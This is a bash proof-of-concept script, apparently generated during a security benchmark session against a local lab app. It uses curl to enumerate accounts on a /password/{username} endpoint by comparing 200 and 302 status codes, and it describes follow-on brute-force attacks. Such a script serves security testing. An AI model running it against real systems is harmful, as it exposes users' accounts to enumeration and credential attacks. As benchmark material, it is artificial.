#!/bin/bash
# POC: Demonstrates account enumeration by detecting HTTP response code differentials on the /password/{username} endpoint. Valid usernames return 200, invalid usernames return 302.
# Target: ./repo
# Created: 2025-11-04T17:33:15.934Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# Account Enumeration via Response Code Differentials POC
# This script demonstrates how attackers can enumerate valid accounts
# by analyzing HTTP status codes returned by the /password endpoint

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/password"

echo "=== Account Enumeration via Response Code Differentials ==="
echo "Target: $TARGET_URL"
echo "Endpoint: $ENDPOINT/{username}"
echo ""

# List of usernames to test
VALID_USERNAMES=("test" "flag")
INVALID_USERNAMES=("admin" "user1" "user2" "john")

echo "[*] Testing VALID usernames (should return 200):"
echo ""

for username in "${VALID_USERNAMES[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$ENDPOINT/$username")
    echo "Username: '$username' -> HTTP Status: $response"
    
    # Verify this is a valid account by checking for form content
    content=$(curl -s "$TARGET_URL$ENDPOINT/$username")
    if echo "$content" | grep -q "type=\"password\""; then
        echo "  ✓ Confirmed: Password form found in response"
    fi
done

echo ""
echo "[*] Testing INVALID usernames (should return 302):"
echo ""

for username in "${INVALID_USERNAMES[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$ENDPOINT/$username")
    echo "Username: '$username' -> HTTP Status: $response"
    
    # Check if it's a redirect
    if [ "$response" = "302" ]; then
        location=$(curl -s -i "$TARGET_URL$ENDPOINT/$username" 2>&1 | grep -i "location:" | head -1)
        echo "  ✓ Confirmed: Redirect detected - $location"
    fi
done

echo ""
echo "[*] ANALYSIS:"
echo "The differential response codes (200 vs 302) enable reliable enumeration."
echo "200 = Valid account exists"
echo "302 = Invalid account (user not found)"
echo ""
echo "[*] Attack Scenario:"
echo "An attacker can systematically test common usernames and build a list"
echo "of valid accounts by checking for HTTP 200 responses, then target"
echo "those accounts with brute force or other attacks."